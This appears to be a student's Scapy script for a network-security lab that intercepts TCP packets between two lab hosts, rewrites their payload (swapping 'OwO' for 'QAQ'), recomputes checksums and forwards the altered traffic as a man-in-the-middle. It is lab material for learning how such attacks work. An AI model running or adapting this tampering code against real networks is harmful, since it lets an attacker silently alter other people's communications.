#!/usr/bin/python3
from scapy.all import *
VM_A_IP = "10.9.0.5"
VM_B_IP = "10.9.0.7"
def spoof_pkt(pkt):
    if pkt[IP].src == VM_A_IP and pkt[IP].dst == VM_B_IP:
        # Create a new packet based on the captured one.
        # (1) We need to delete the checksum fields in the IP and TCP headers,
        # because our modification will make them invalid.
        # Scapy will recalculate them for us if these fields are missing.
        # (2) We also delete the original TCP payload.
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        del(newpkt[TCP].payload)
        #####################################################################
        # Construct the new payload based on the old payload.
        # Students need to implement this part.
        if pkt[TCP].payload:
            olddata = pkt[TCP].payload.load # Get the original payload data
            newdata = olddata.replace(b'OwO',b"QAQ") # No change is made in this sample code
            print(olddata, "==>", newdata)
            newpkt[IP].len = newpkt[IP].len + len(newdata) - len(olddata) 
            send(newpkt/newdata, verbose = False)
        else :
            send(newpkt, verbose = False)
    elif pkt[IP].src == VM_B_IP and pkt[IP].dst == VM_A_IP:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt, verbose=False) # Forward the original packet
pkt = sniff(filter='tcp and (ether src 02:42:0a:09:00:05 or ether src 02:42:0a:09:00:07)',prn=spoof_pkt)
